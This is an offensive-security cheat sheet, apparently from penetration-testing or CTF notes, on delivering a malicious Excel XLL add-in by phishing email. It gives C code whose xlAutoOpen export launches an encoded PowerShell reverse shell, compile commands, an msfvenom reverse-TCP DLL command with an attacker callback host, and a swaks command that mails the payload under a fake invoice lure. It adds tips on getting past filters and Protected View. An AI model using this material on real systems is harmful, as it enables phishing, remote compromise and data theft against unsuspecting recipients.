# XLL Excel Add-In Phishing

XLL files are Excel add-ins (DLLs) that execute code when opened. Send via email to get a shell as the recipient.

## Create XLL Payload

Use the Excel-DNA framework or a C DLL with `xlAutoOpen` export:

```c
// minimal_xll.c - compile as DLL, rename to .xll
#include <windows.h>
int __declspec(dllexport) xlAutoOpen() {
    WinExec("powershell -e <BASE64_REVSHELL>", 0);
    return 1;
}
```

```bash
# Cross-compile on Linux:
x86_64-w64-mingw32-gcc -shared -o payload.xll minimal_xll.c
```

Or use msfvenom:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o payload.xll
```

## Send via Email (swaks)

```bash
swaks --to <TARGET_EMAIL> \
      --from attacker@<DOMAIN> \
      --header "Subject: Invoice overdue!" \
      --body "Please review the attached invoice." \
      --attach @payload.xll
```

## Verify Execution

```bash
sudo tcpdump -ni tun0 icmp   # confirm callback before deploying reverse shell
```

## Notes

- Requires target to open in Excel (not preview); Excel 2016+ prompts about add-ins
- Protected View blocks XLLs opened from email unless user clicks "Enable Editing"
- File extension `.xll` is less commonly filtered than `.xlsm` or `.xlam`
- hMailServer stores emails at `C:\Program Files (x86)\hMailServer\Data\<domain>\<user>\`
- Attachments reviewed and moved to `ReviewedAttachments\` by automated processes
